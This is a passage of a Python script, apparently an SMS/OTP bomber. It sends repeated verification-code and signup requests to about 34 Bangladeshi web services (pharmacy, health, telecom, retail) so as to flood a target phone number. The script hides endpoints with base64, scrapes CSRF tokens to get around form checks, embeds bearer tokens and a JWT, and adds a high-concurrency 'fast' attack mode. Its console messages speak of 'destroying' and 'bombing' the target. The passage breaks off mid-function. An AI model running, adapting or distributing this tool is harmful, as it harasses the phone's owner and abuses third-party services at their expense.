        }
        
        print(f"{_c['y']}Pain Increasing...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            payload = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s19(self, session):
        csrf_url = base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC8=').decode()
        try:
            async with session.get(csrf_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                import re
                csrf_match = re.search(r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']', text)
                csrf_token = csrf_match.group(1) if csrf_match else "default_token"
        except:
            csrf_token = "default_token"
        
        url = base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC9hdXRoZW50aWNhdGlvbi9zZW5kLW90cA==').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC8=').decode(),
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Crashing All Service...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            data = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s20(self, session):
        signup_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9zaWdudXA=').decode()
        resend_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9yZXNlbmRfY29kZQ==').decode()
        forget_url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9wYXNzd29yZC9mb3JnZXRfcmVxdWVzdA==').decode()
        
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr",
            "origin": base64.b64decode(b'aHR0cHM6Ly9zYWlsb3IuY2xvdGhpbmc=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9zYWlsb3IuY2xvdGhpbmcv').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Number DDoS launching more...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            forget_data = {"email_or_phone": phone, "send_code_by": "phone"}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(forget_url, headers=h, json=forget_data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BOMBING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s21(self, session):
        register_url = base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20vcmVnaXN0ZXI=').decode()
        otp_url = base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20vcmVnaXN0ZXJfb3Rw').decode()
        
        try:
            async with session.get(register_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                import re
                token_match = re.search(r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', text)
                csrf_token = token_match.group(1) if token_match else "default_token"
        except:
            csrf_token = "default_token"
        
        h = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuaXNoby5jb20=').decode(),
            "referer": register_url,
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Crashing the target number {_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            import random, string
            email = f"{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com"
            
            data = {"_token": csrf_token, "phone": phone, "email": email}
            
            print(f"{_c['c']}[{i+1}/5] BOMBING {phone}...{_c['e']}")
            
            try:
                async with session.post(otp_url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BOMBING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("BOMBING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s22(self, session):
        url = f"https://api.medeasy.health/api/send-otp/{self.phone_data['with_plus88']}/"
        h = {
            "accept": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9tZWRlYXN5LmhlYWx0aA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9tZWRlYXN5LmhlYWx0aC8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Device Hanging...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            
            print(f"{_c['c']}[{i+1}/5] BOMBING {phone}...{_c['e']}")
            
            try:
                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BOMBING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ATTACKING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s23(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "authorization": "Bearer undefined",
            "origin": base64.b64decode(b'aHR0cHM6Ly9vc3VkcG90cm8uY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9vc3VkcG90cm8uY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Successful Attack...{_c['e']}")
        
        for i in range(5):
            phone = f"+88-{self.phone_data['cleaned']}"
            payload = {"mobile": phone, "deviceToken": "web", "language": "en", "os": "web"}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s24(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly90aGVjbGluaWNhbGwuY29tL2JrYXBpL2F1dGgvdXNlci9vdHAvc2lnbmlu').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer Hello",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cudGhlY2xpbmljYWxsLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cudGhlY2xpbmljYWxsLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Successful Attack...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['cleaned']
            payload = {"countryCode": "BD", "dialCode": "880", "phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] DESTROYING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("ATTACKING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s25(self, session):
        login_url = base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20vdXNlcmxvZ2lu').decode()
        otp_url = base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20vYXBpL290cC1sb2dpbg==').decode()
        
        try:
            async with session.get(login_url, ssl=_ssl, timeout=15) as resp:
                text = await resp.text()
                import re
                xsrf_match = re.search(r'XSRF[_-]?TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']', text)
                xsrf_token = xsrf_match.group(1) if xsrf_match else "default_token"
        except:
            xsrf_token = "default_token"
        
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9zaG9tYmhvYi5jb20=').decode(),
            "referer": login_url,
            "x-xsrf-token": xsrf_token,
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Device Getting Heated Slowly Cause Of Vibration{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(otp_url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s26(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cuYXBpLWNhcmUtYm94LmNsaWNrL2FwaS91c2VyL3JlZ2lzdGVyLz92ZXJzaW9uPW90cA==').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuY2FyZS1ib3guY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuY2FyZS1ib3guY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Working...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            import random
            names = ["Rakib Khan", "Md Hossain", "Sajib Ahmed", "Arif Hasan"]
            name = random.choice(names)
            payload = {"Name": name, "Phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Care Box", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Care Box", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s27(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9yZW5peGFwaS5yZW5peGNhcmUuY29tL3Ntcy1hcGkvc2VuZC1vdHA=').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9yZW5peGNhcmUuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9yZW5peGNhcmUuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Working...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] SUCCESSFUL {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("ATTACKING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s28(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbS9hcGkvcmVnaXN0ZXIvY2hlY2stdXNlcm5hbWU=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "device": "desktop",
            "domain": "www.jayabaji3.com",
            "lang": "bn-bd",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuamF5YWJhamkzLmNvbS9ibi1iZD9zaWdudXA9MQ==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Destroying the target...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['cleaned']
            import random, string
            username = f"sojib{''.join(random.choices(string.digits, k=5))}"
            payload = {"username": username, "email": "", "mobileno": phone, "language": "bn", "langCountry": "bn-bd"}
            
            print(f"{_c['c']}[{i+1}/5] DESTROYING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s29(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvcmVnaXN0ZXI=').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20=').decode(),
            'Referer': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20v').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}Wait....{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"countryDialingCode": "880", "mobileNo": phone}
            
            print(f"{_c['c']}[{i+1}/5] DESTROYING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s30(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvbm9Mb2dpbg==').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20=').decode(),
            'Referer': base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20v').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}Successful Attack...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"mobileNum": phone, "countryDialingCode": "880"}
            
            print(f"{_c['c']}[{i+1}/5] ATTACKING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ATTACKING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s31(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9ncHdlYm1zLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2ZsZXhpcGxhbi1wdXJjaGFzZS9hY3RpdmF0aW9u').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer null",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Launching More Cyberattacks{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"payment_mode": "mobile_balance", "longevity": 1, "voice": 100, "data": 0, "fourg": 0, "bioscope": 0, "sms": 0, "mca": 0, "price": 69, "msisdn": phone, "bundle_id": 60817, "is_login": False}
            
            print(f"{_c['c']}[{i+1}/5] ATTACKING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s32(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9ncGZpLmdyYW1lZW5waG9uZS5jb20=').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9ncGZpLmdyYW1lZW5waG9uZS5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Increasing The Attack...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone, "email": "", "language": "en"}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("ATTACKING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ATTACKING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s33(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9jaGFubmVscy5tZXZyaWsuY29tOjQyMDIvYXBpL3YxL2NsYWltLXNlc3Npb24=').decode()
        h = {
            "Accept": "application/json",
            "Content-Type": "text/plain",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9jaGF0Lm1ldnJpay5jb206NDIxMw==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9jaGF0Lm1ldnJpay5jb206NDIxMy8=').decode(),
            "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Increasing The Attack...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            import random
            names = ["MD Hossain", "Ali Khan", "Rahim Ahmed", "Rakib Hasan"]
            name = random.choice(names)
            payload = {"data": {"user_ref": phone, "name": name}}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Mevrik", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Mevrik", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s34(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=').decode()
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        print(f"{_c['y']}Target device getting hanged sim space now burning slowly...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"mobile": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("ATTACKING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ATTACKING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _run_all_services_slowly(self):
        print(f"\n{_c['r']}🚀 LAUNCHING SLOW CONTROLLED ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 34+ APIs SENDING 5 REQUESTS EACH ONE BY ONE!{_c['e']}")
        print(f"{_c['p']}💥 SLOW SPEED × CONTROLLED POWER × SEQUENTIAL BOMBING{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:
            
            print(f"{_c['c']}[SLOW MODE] Running 34+ services sequentially (each sends 5 requests)...{_c['e']}")
            
            start_time = time.time()
            
            await self._s1(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s2(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s4(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s3(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s17(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s18(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s5(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s6(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s7(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s14(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s8(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s9(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s19(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s22(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s24(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s26(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s27(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s20(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s21(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s10(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s11(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s12(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s25(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s13(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s15(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s16(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s31(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s32(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s33(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s28(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s29(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s30(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s23(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            await asyncio.sleep(1)
            
            await self._s34(session)
            print(f"{_c['g']}██████████████████████████████████████████████████████████████████████{_c['e']}")
            
            end_time = time.time()
            
            print(f"\n{_c['g']}[ATTACK COMPLETE] Slow controlled attack finished!{_c['e']}")
            print(f"{_c['g']}[SLOW SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] 170+ SMS requests sent (34+ APIs × 5 requests each){_c['e']}")

    async def _run_all_services_fast(self):
        print(f"\n{_c['r']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['y']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['p']}LAUNCHING ALL BOMBS ARE NOW READY TO GO{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        timeout = aiohttp.ClientTimeout(total=8, connect=3)
        connector = aiohttp.TCPConnector(
            limit=500,
            limit_per_host=100,
            ssl=_ssl,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(
